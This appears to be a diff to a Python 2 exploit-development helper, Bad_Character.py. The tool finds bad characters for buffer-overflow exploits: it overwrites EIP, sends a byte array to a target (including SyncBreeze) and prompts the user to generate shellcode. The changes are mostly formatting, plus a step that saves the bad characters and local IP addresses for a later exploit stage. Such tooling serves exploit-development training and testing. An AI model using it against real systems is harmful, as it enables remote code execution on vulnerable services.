@@ -6,6 +6,8 @@ import readline
 import os
 from Banner import *
 import requests
+from subprocess import check_output 
+
 
 W='\033[0m'     
 R='\033[31m'    
@@ -52,13 +54,13 @@ class Bad_Character:
                       print R+self.hex_x+W 
                       print (O+'='*50+W)   
                       time.sleep(2)             
-                 print Y+"\n[+]"+W+B+"Conncet Server Ip "+W+O+"    : "+W, P+self.server_ip+W
+                 print Y+"\n[+] "+W+B+"Conncet Server Ip "+W+O+"    : "+W, P+self.server_ip+W
                  time.sleep(2)
-                 print Y+"\n[+]"+W+B+"Conncet Server Port "+W+O+"  : "+W, P+str(self.server_port)+W
+                 print Y+"\n[+] "+W+B+"Conncet Server Port "+W+O+"  : "+W, P+str(self.server_port)+W
                  time.sleep(1)
-                 print Y+"\n[+]"+W+B+"Overflow 0ffset at  "+W+O+"  : "+W,P+self.location+W
+                 print Y+"\n[+] "+W+B+"Overflow 0ffset at  "+W+O+"  : "+W,P+self.location+W
                  time.sleep(2)
-                 print Y+"\n[+]"+W+B+"Over write EIP Value "+W+O+" : "+W,P+'\\x42\\x42\\x42\\x42'+W 
+                 print Y+"\n[+] "+W+B+"Over write EIP Value "+W+O+" : "+W,P+'\\x42\\x42\\x42\\x42'+W 
                  self.hex_num_send   =''.join("\\x"+'{:02x}'.format(x)for x in range(0,256)) 
                  with open('textarray','w') as array_1 :
                       file1 = self.hex_num_send.replace('\\x','')
@@ -77,16 +79,16 @@ class Bad_Character:
                if self.hex_input not in list_add:
                    list_add.append(self.hex_input)
                else:
-                  print P+"\n[?]the Bad_Character.py Not Found [",self.hex_input,"]  Maybe Removed[?]" +W  
+                  print P+"\n[?] the Bad_Character.py Not Found [",self.hex_input,"]  Maybe Removed[?]" +W  
                   time.sleep(2) 
                   return self.input_hex()            
                if len(self.hex_input)== 4 and '\\x' in self.hex_input :
                     self.input_send = self.hex_x.replace(self.hex_input,'')
                else:
                   time.sleep(2) 
-                  print P+"\n[!]bad input order[!]"+W 
+                  print P+"\n[!] bad input order [!]"+W 
                   time.sleep(2)    
-                  print R+"\n[#]Enter the Number in hexadecimal value "+W
+                  print R+"\n[#] Enter the Number in hexadecimal value "+W
                   return self.input_hex()
           except KeyboardInterrupt:
                    print Banner
@@ -113,7 +115,7 @@ class Bad_Character:
                             self.file1 = readarray.read()                      
                             self.file = self.file1.decode('hex')                                                                 
                     else:                       
-                        print P+"\n[?]the Bad_Character.py Not Found [",self.hex_input,"]  Maybe Removed[?]" +W
+                        print P+"\n[?] the Bad_Character.py Not Found [",self.hex_input,"]  Maybe Removed [?]" +W
                         time.sleep(2) 
                         self.input_hex()                                               
                         self.HEX_FORMAT()                                               
@@ -144,7 +146,8 @@ class Bad_Character:
        def main(self):
           self.HEX_array() 
           self._SOCKET_SOCKET()
-          list=[]          
+          list=[]
+          list2=[]          
           while True:
             try:     
               self.out_q = 'q'.lower() 
@@ -154,25 +157,29 @@ class Bad_Character:
               self.HEX_FORMAT()
               self._SOCKET_SOCKET()
               def select():       
-                 self.out = str(raw_input(P+"\n[*]"+W+B+"to quit press "+W+R+'Q'+W+B+" to continue press "+W+R+'D '+W+O+':'+W )).lower()              
+                 self.out = str(raw_input(P+"\n[*] "+W+B+"to quit press "+W+R+'Q'+W+B+" to continue press "+W+R+'D '+W+O+':'+W )).lower()              
                  if self.hex_input not in list :
                      list.append(self.hex_input) 
+                     list2.append('\\'+self.hex_input)
                  if self.out == self.out_q and len(self.out)==1 :                
-                    print Y+"\n[#]"+W+P+"Generant Shellcode with out :"+W,O+''.join(list)+W
+                    print Y+"\n[#] "+W+P+"Generant Shellcode with out :"+W,O+''.join(list)+W
                     time.sleep(2)
                     print O+"\n\t\t ***_***"+W+Y+" Test Bad Character is Finish "+W+O+"***_*** "+W
                     time.sleep(2)
                     print R+"\n\t\t!___To Continue Explit Generate shellcode and post it in shell_code.py file___! \n"+W 
                     os.remove('txt')
-                    os.remove('textarray')   
-                    os.remove('.data')             
+                    os.remove('textarray') 
+                    host_ip   = check_output(['hostname', '--all-ip-addresses']).decode('utf8').replace('\n','')
+                    with open('.data','a') as append:
+                        append_bad =append.write('\n'+str(''.join(list)))                       
+                        append_bad =append.write('\n'+str(''.join(list2)+'\n'+ host_ip.replace(' ','\n')))         
                  elif self.out == self.continue_skip and len(self.continue_skip)==1 : 
                     pass  
                  else:
                    time.sleep(2)
-                   print O+"\n[*]"+W+R+"Please enter "+W+B+'Q '+W+R+" or "+W+B+" D "+W+O+"[#]"+W  
+                   print O+"\n[*] "+W+R+"Please enter "+W+B+'Q '+W+R+" or "+W+B+" D "+W+O+"[#]"+W  
                    time.sleep(2)
-                   print Y+"\n[#]"+W+P+"Bad Character Removed is : "+W,O+''.join(list)+W
+                   print Y+"\n[#] "+W+P+"Bad Character Removed is : "+W,O+''.join(list)+W
                    return select()  
               select()                    
               if self.out == self.out_q :
@@ -209,7 +216,7 @@ class Bad_Character_Clinet:
               self.listen_sock.listen(1)
               time.sleep(2)
               #self.listen_sock.settimeout(30)
-              print Y+"\n[#]"+W+P+"Bad Character Listen from "+W+R +" 0.0.0.0 "+W+P+" in port"+W,self.port,Y+"[<>]"+W
+              print Y+"\n[#] "+W+P+"Bad Character Listen from "+W+R +" 0.0.0.0 "+W+P+" in port"+W,self.port,Y+"[<>]"+W
               time.sleep(2)
               print O+"\t\t\t\n>>>>"+W+Y+" Wating For incoming Connection "+W+O+" >>>>"+W
           except socket.error, exc:               
@@ -242,13 +249,13 @@ class Bad_Character_Clinet:
                       print R+self.hex_x+W 
                       print (O+'='*50+W)   
                       time.sleep(2)             
-                 print Y+"\n[+]"+W+B+"Server Listein  Ip "+W+O+"    : "+W, P+'0.0.0.0'+W
+                 print Y+"\n[+] "+W+B+"Server Listein  Ip "+W+O+"    : "+W, P+'0.0.0.0'+W
                  time.sleep(2)
-                 print Y+"\n[+]"+W+B+"Server Listein Port "+W+O+"  : "+W, P+'21'+W
+                 print Y+"\n[+] "+W+B+"Server Listein Port "+W+O+"  : "+W, P+'21'+W
                  time.sleep(1)
-                 print Y+"\n[+]"+W+B+"Overflow 0ffset at  "+W+O+"  : "+W,P+self.location+W
+                 print Y+"\n[+] "+W+B+"Overflow 0ffset at  "+W+O+"  : "+W,P+self.location+W
                  time.sleep(2)
-                 print Y+"\n[+]"+W+B+"Over write EIP Value "+W+O+" : "+W,P+'\\x42\\x42\\x42\\x42'+W 
+                 print Y+"\n[+] "+W+B+"Over write EIP Value "+W+O+" : "+W,P+'\\x42\\x42\\x42\\x42'+W 
                  self.hex_num_send   =''.join("\\x"+'{:02x}'.format(x)for x in range(0,256)) 
                  with open('textarray','w') as array_1 :
                       file1 = self.hex_num_send.replace('\\x','')
@@ -267,16 +274,16 @@ class Bad_Character_Clinet:
                if self.hex_input not in list_add:
                   list_add.append(self.hex_input)                
                else:
-                  print P+"\n[?]the Bad_Character.py Not Found [",self.hex_input,"]  Maybe Removed[?]" +W  
+                  print P+"\n[?] the Bad_Character.py Not Found [",self.hex_input,"]  Maybe Removed[?]" +W  
                   time.sleep(2) 
                   return self.input_hex()                 
                if len(self.hex_input)== 4 and '\\x' in self.hex_input :
                     self.input_send = self.hex_x.replace(self.hex_input,'')
                else:
                   time.sleep(2) 
-                  print P+"\n[!]bad input order[!]"+W 
+                  print P+"\n[!] bad input order[!]"+W 
                   time.sleep(2)    
-                  print R+"\n[#]Enter the Number in hexadecimal value "+W
+                  print R+"\n[#] Enter the Number in hexadecimal value "+W
                   return self.input_hex()
           except KeyboardInterrupt:
                    print Banner
@@ -303,7 +310,7 @@ class Bad_Character_Clinet:
                             self.file1 = readarray.read()                      
                             self.file = self.file1.decode('hex')                                                                 
                     else:                       
-                        print P+"\n[?]the Bad_Character.py Not Found [",self.hex_input,"]  Maybe Removed[?]" +W
+                        print P+"\n[?] the Bad_Character.py Not Found [",self.hex_input,"]  Maybe Removed [?]" +W
                         time.sleep(2) 
                         self.input_hex()                                               
                         self.HEX_FORMAT()
@@ -331,7 +338,8 @@ class Bad_Character_Clinet:
           self.HEX_array()
           self.Listen_FAKE()
           self.send()
-          list=[]          
+          list=[] 
+          list2=[]         
           while True:
             try:     
               out_q = 'q'.lower() 
@@ -345,23 +353,26 @@ class Bad_Character_Clinet:
               if self.hex_input not in list :
                      list.append(self.hex_input) 
               if out == out_q and len(out)==1 :                
-                 print Y+"\n[#]"+W+P+"Generant Shellcode with out :"+W,O+''.join(list)+W
+                 print Y+"\n[#] "+W+P+"Generant Shellcode with out :"+W,O+''.join(list)+W
                  print O+"\n\t\t ***_***"+W+Y+" Test Bad Character is Finish "+W+O+"***_*** "+W
                  print R+"\n\t\t!___To Continue Explit Generate shellcode and post it in shell_code.py file___! \n"+W 
                  os.remove('txt')
                  os.remove('textarray')   
-                 os.remove('.data')             
+                 host_ip   = check_output(['hostname', '--all-ip-addresses']).decode('utf8').replace('\n','')
+                 with open('.data','a') as append:
+                       append_bad =append.write('\n'+str(''.join(list)))                       
+                       append_bad =append.write('\n'+str(''.join(list2)+'\n'+ host_ip.replace(' ','\n')))            
                  break
               elif out == continue_skip and len(out)==1 : 
                   pass  
               else:
-                 print O+"[*]"+W+R+"\nPlease enter "+W+B+'Q '+W+R+" or "+W+B+" D "+W+O+"[#]"+W 
+                 print O+"[*] "+W+R+"\nPlease enter "+W+B+'Q '+W+R+" or "+W+B+" D "+W+O+"[#]"+W 
                  self.input_hex()
                  self.HEX_FORMAT()
                  self.Listen_FAKE()
                  self.send()
                  self.main()                        
-              print Y+"\n[#]"+W+P+"Bad Character Removed is : "+W,O+''.join(list)+W                           
+              print Y+"\n[#] "+W+P+"Bad Character Removed is : "+W,O+''.join(list)+W                           
             except KeyboardInterrupt:
                  print Banner
                  exit()
@@ -406,11 +417,11 @@ class Bad_Character_SyncBreeze:
                       print R+self.hex_x+W 
                       print (O+'='*50+W)   
                       time.sleep(2)             
-                 print Y+"\n[+]"+W+B+"HTTP Login Page "+W+O+"    : "+W, P+self.target_url+W
+                 print Y+"\n[+] "+W+B+"HTTP Login Page "+W+O+"    : "+W, P+self.target_url+W
                  time.sleep(2)
-                 print Y+"\n[+]"+W+B+"Overflow 0ffset at  "+W+O+"  : "+W,P+self.location+W
+                 print Y+"\n[+] "+W+B+"Overflow 0ffset at  "+W+O+"  : "+W,P+self.location+W
                  time.sleep(2)
-                 print Y+"\n[+]"+W+B+"Over write EIP Value "+W+O+" : "+W,P+'\\x42\\x42\\x42\\x42'+W 
+                 print Y+"\n[+] "+W+B+"Over write EIP Value "+W+O+" : "+W,P+'\\x42\\x42\\x42\\x42'+W 
                  self.hex_num_send   =''.join("\\x"+'{:02x}'.format(x)for x in range(0,256)) 
                  with open('textarray','w') as array_1 :
                       file1 = self.hex_num_send.replace('\\x','')
@@ -425,20 +436,20 @@ class Bad_Character_SyncBreeze:
        def input_hex(self):
           try :
                list_add = []
-               self.hex_input  = str(raw_input(O+"\n[%]"+W+B+"Enter the Hex Number Badchar"+W+O+" :"+W))                  
+               self.hex_input  = str(raw_input(O+"\n[%] "+W+B+"Enter the Hex Number Badchar"+W+O+" :"+W))                  
                if self.hex_input not in list_add:
                   list_add.append(self.hex_input)
                else:
-                  print P+"\n[?]the Bad_Character.py Not Found [",self.hex_input,"]  Maybe Removed[?]" +W  
+                  print P+"\n[?] the Bad_Character.py Not Found [",self.hex_input,"]  Maybe Removed [?]" +W  
                   time.sleep(2) 
                   return self.input_hex()               
                if len(self.hex_input)== 4 and '\\x' in self.hex_input :
                     self.input_send = self.hex_x.replace(self.hex_input,'')
                else:
                   time.sleep(2) 
-                  print P+"\n[!]bad input order[!]"+W 
+                  print P+"\n[!] bad input order [!]"+W 
                   time.sleep(2)    
-                  print R+"\n[#]Enter the Number in hexadecimal value "+W
+                  print R+"\n[#] Enter the Number in hexadecimal value "+W
                   return self.input_hex()
           except KeyboardInterrupt:
                    print Banner
@@ -511,7 +522,8 @@ class Bad_Character_SyncBreeze:
        def main(self):
           self.HEX_array() 
           self.connect_login()
-          list=[]          
+          list=[]  
+          list2=[]        
           while True:
             try:     
               self.out_q = 'q'.lower() 
@@ -532,14 +544,17 @@ class Bad_Character_SyncBreeze:
                     print R+"\n\t\t!___To Continue Explit Generate shellcode and post it in shell_code.py file___! \n"+W 
                     os.remove('txt')
                     os.remove('textarray')   
-                    os.remove('.data')             
+                    host_ip   = check_output(['hostname', '--all-ip-addresses']).decode('utf8').replace('\n','')
+                    with open('.data','a') as append:
+                       append_bad =append.write('\n'+str(''.join(list)))                       
+                       append_bad =append.write('\n'+str(''.join(list2)+'\n'+ host_ip.replace(' ','\n')))                  
                  elif self.out == self.continue_skip and len(self.continue_skip)==1 : 
                     pass  
                  else:
                    time.sleep(2)
-                   print O+"\n[*]"+W+R+"Please enter "+W+B+'Q '+W+R+" or "+W+B+" D "+W+O+"[#]"+W  
+                   print O+"\n[*] "+W+R+"Please enter "+W+B+'Q '+W+R+" or "+W+B+" D "+W+O+"[#]"+W  
                    time.sleep(2)
-                   print Y+"\n[#]"+W+P+"Bad Character Removed is : "+W,O+''.join(list)+W
+                   print Y+"\n[#] "+W+P+"Bad Character Removed is : "+W,O+''.join(list)+W
                    return select()  
               select()                    
               if self.out == self.out_q :
@@ -549,3 +564,5 @@ class Bad_Character_SyncBreeze:
                  exit()
 if __name__ =='__main__':
    Bad_Character_SyncBreeze()
+
+
